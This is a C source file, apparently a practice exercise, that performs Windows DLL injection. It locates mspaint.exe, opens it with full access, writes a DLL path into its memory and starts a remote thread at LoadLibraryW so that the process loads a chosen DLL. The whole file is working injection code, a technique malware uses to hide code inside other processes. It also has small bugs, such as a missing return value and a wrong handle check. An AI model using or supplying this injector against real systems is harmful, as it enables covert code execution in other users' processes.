

/**	what this dll injection does (one implementation of many)
 * know that the return address of a function is pushed
 * 
 */


// compile using 
// "clang -m64 -o d.exe dll.c"

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#define DECOR() printf("==================================================================\n")
#define INFO(MSG, ...) printf("[-_-]"  MSG  "\n", ##__VA_ARGS__)
#define GOOD(MSG, ...) printf("[^_^]"  MSG  "\n", ##__VA_ARGS__)
#define ERR(MSG, ...) {	DECOR();				          \
			fprintf(stderr,				      	          \
	      	      		"[EEK] "  MSG "\n"		       	  \
				"[EEK] ERROR CODE:      0x%ld\n"          \
				"[EEK] FUNCTION:        %s()\n" 	      \
				"[EEK] LINE: 	       %ld\n",            \
				GetLastError(),__func__,__LINE__);     	  \
				DECOR();			          			  \
		      }

DWORD getPID(_In_ const char* processName);
HMODULE inject(_In_ DWORD PID);
VOID CleanHandleWait(
		_In_ HANDLE hProcess,
		_In_ HANDLE hThread
		);


const wchar_t dllPath[MAX_PATH] = L"C:\\Users\\thien\\Desktop\\injector\\crow_practice\\dll\\Dll1\\x64\\Debug\\long_dll_name_fake.dll";		
const size_t dllPathSize = sizeof(dllPath);

int main(void)
{
	DWORD PID = getPID("mspaint.exe");
	if(PID == -1)
	{
		return EXIT_FAILURE;
	}

	inject(PID);

	return EXIT_SUCCESS;
}


//the problem is most likely that UNICODE is not recognized.
DWORD getPID(_In_ const char* processName)
{
	HANDLE hProcessSnap = NULL;	//list of processes
	PROCESSENTRY32 pe32;		//info of process
	
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if(hProcessSnap == INVALID_HANDLE_VALUE)
		{
			ERR("SNAPSHOT NOT FOUND");
			return -1;
		}

	GOOD("TOOK A SNAPSHOT...");

	pe32.dwSize = sizeof(PROCESSENTRY32);	//required for Process32 function

		if(Process32First(
			hProcessSnap, 			//list of processes
			&pe32	      			//change pe32 value
			))
		{
			do{
				if(strcmp(pe32.szExeFile, processName) == 0)
				{
					GOOD("FOUND PID FOR: %s", processName);
					CloseHandle(hProcessSnap);
					return pe32.th32ProcessID;
				}	
			}while(Process32Next(hProcessSnap, &pe32));
		}

	ERR("No PID found...");
	CloseHandle(hProcessSnap);
	return -1;
}

HMODULE inject(_In_ DWORD PID)
{
	SIZE_T bytesWritten = 0;	//bytes output
	HMODULE hKernel32;			//kernel needed to load 
	PVOID p_LoadLibrary;		//function address

	INFO("Trying to get a handle to Kernel32.dll...");
	hKernel32 = GetModuleHandleW(
						L"Kernel32.dll"
					);
		if(hKernel32 == NULL)
		{
			ERR("CANNOT GET KERNEL MODULE HANDLE");
			return NULL;
		}
	GOOD("[0x%p] Got a handle to Kernel32.dll!", hKernel32);


	INFO("Trying to get the address of LoadLibraryW!");
	p_LoadLibrary = GetProcAddress(
						hKernel32, 
						"LoadLibraryW"
					);
		if(p_LoadLibrary == NULL)
		{
			ERR("CANNOT GET KERNEL PROC ADDRESS");
			return NULL;
		}
	GOOD("[0x%p] Got the address of LoadLibraryW!", p_LoadLibrary);


	INFO("Trying to get a handle on the process, (%ld)...",PID);
	HANDLE hProcess = OpenProcess(
		PROCESS_ALL_ACCESS, 					//access flags
		FALSE, 									//handle inheritance
		PID										//DWORD Process ID
	);
		if(hProcess == INVALID_HANDLE_VALUE)
		{
			ERR("COULD NOT OPEN PROCESS");
			return NULL;
		}

	GOOD("[0x%p] Got a handle on the process!", hProcess);


	INFO("Allocating %zu-bytes to the process...",dllPathSize);
	LPVOID lpBaseAddress = VirtualAllocEx(
		hProcess,								//process to allocate to
		NULL,									//starting address
		dllPathSize,							//size of memory region
		(MEM_COMMIT | MEM_RESERVE),				//allocation type flags
		PAGE_READWRITE							//memory protection flags (suspicious)
	);
		if(lpBaseAddress == NULL)
		{
			ERR("COULD NOT ALLOCATE MEMORY");
			return NULL;
		}
	GOOD("[0x%p] Allocated %zu-bytes with READWRITE permissions.",lpBaseAddress, dllPathSize);


	INFO("[0x%p] Writing %zu-bytes to the allocated buffer.", lpBaseAddress, dllPathSize);
	BOOL isWritten = WriteProcessMemory(
		hProcess,							     //process to allocate to
		lpBaseAddress,						     //starting address
		dllPath,						    	 //LPCVOID buffer (pointer  to a constant of any type)
		dllPathSize,		     				//# of bytes to be written (in)
		&bytesWritten							         //# of bytes written	   (out)
	);

		if(!isWritten)
		{
			ERR("COULD NOT WRITE TO PROCESS MEMORY");
			return NULL;
		}
	GOOD("[0x%p] Wrote %zu-bytes to the allocated buffer.", lpBaseAddress, bytesWritten);


	INFO("Creating a thread...");
	HANDLE hThread = CreateRemoteThreadEx(
		hProcess,			 				   	 //process to create thread
		NULL,    								 //security attributes
		0,	 		       						 //dwStackSize (See Thread Stack Size on the MSDN for more information.)
		(LPTHREAD_START_ROUTINE)p_LoadLibrary,	 //starting address from memory allocated
		lpBaseAddress,							 //pointer to be passed through to the thread function (no need?)
		0,    									 //creation behavior flag
		NULL,									 //lpAttributeList (in)
		NULL									 //lpThreadId (out)
	);
		if (hThread == NULL) {
			ERR("Could not create a thread");
		}
    GOOD("[0x%p] successfully created a thread!", hThread);


	CleanHandleWait(hProcess,hThread);
}

VOID CleanHandleWait(HANDLE hProcess, HANDLE hThread){
	switch(WaitForSingleObject(hProcess,INFINITE)){
		case WAIT_OBJECT_0:
		INFO("Process is closing...");
			if(hProcess != NULL){CloseHandle(hProcess);}
			if(hThread != NULL){CloseHandle(hThread);}
		GOOD("HANDLES CLOSED");
		break;

		case WAIT_TIMEOUT:
		break;

		case WAIT_FAILED:
			if(hProcess != NULL){CloseHandle(hProcess);}
			if(hThread != NULL){CloseHandle(hThread);}
		ERR("PROCESS WAIT FAILED");
		break;

		default:
		ERR("UNKNOWN SIGNAL");
	}
}


 
